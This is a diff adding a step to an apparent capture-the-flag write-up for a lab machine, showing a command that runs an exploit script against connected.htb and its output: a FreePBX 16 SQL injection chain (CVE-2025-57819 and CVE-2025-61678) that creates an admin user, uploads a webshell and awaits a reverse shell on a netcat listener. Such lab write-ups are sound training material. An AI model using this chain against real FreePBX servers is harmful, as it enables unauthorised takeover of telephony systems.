@@ -663,7 +663,35 @@ Now run the script against the target.
 **Result:**
 
 ```shell
+┌──(kali㉿kali)-[~/…/Machines/SN11/Connected/FreePBX-CVE-2025-57819-RCE]
+└─$ python3 exploit.py --rhost connected.htb --rport 80 --http --lhost 10.10.14.85 --lport 4444 
 
+ ██████████ █████                  █████
+░░███░░░░░█░░███                  ░░███
+ ░███  █ ░  ░███████   █████ █████ ░███████
+ ░██████    ░███░░███ ░░███ ░░███  ░███░░███
+ ░███░░█    ░███ ░███  ░░░█████░   ░███ ░███
+ ░███ ░   █ ░███ ░███   ███░░░███  ░███ ░███
+ ██████████ ████ █████ █████ █████ ████████
+░░░░░░░░░░ ░░░░ ░░░░░ ░░░░░ ░░░░░ ░░░░░░░░
+
+    FreePBX 16 SQLi -> Admin -> RCE  (CVE-2025-57819 + CVE-2025-61678)
+    linkedin: ehxb /// medium.com/@Ehxb /// github 0xEHxb
+
+[*] [CVE-2025-57819] creating admin via stacked SQLi: svc_m5p1s:2b92c6uqxc74
+[+] admin row inserted into ampusers
+[*] logging into FreePBX admin panel
+[+] authenticated as svc_m5p1s
+[*] [CVE-2025-61678] uploading webshell -> /wv4j8ldyy2/81eohbar.php
+[+] webshell live: http://connected.htb/wv4j8ldyy2/81eohbar.php
+[!] pwntools not found - start your own listener:
+[!]     nc -lvnp 4444
+[*] press ENTER once your listener is ready...
+```
+
+Press Enter
+
+```
 ```
 <div align="center">
 <br>
